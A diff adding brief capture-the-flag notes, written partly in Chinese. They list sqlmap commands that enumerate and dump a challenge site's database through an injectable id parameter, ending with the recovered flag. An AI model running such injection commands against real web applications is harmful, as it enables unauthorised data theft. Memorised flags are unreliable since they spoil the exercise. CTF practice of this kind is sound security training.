@@ -1,0 +1,10 @@
+sqlmap -u "http://ctf5.shiyanbar.com/8/index.php?id=1" --current-db
+查找数据库
+sqlmap -u "http://ctf5.shiyanbar.com/8/index.php?id=1" -D my_db --tables
+查找表
+sqlmap -u "http://ctf5.shiyanbar.com/8/index.php?id=1" -D my_db -T thiskey --columns
+查找列
+sqlmap -u "http://ctf5.shiyanbar.com/8/index.php?id=1" -D my_db -T thiskey -C K0y --dump
+查找该列内容
+ idnuenna admin
+KEY :!@#WwwN5f0cu5coM
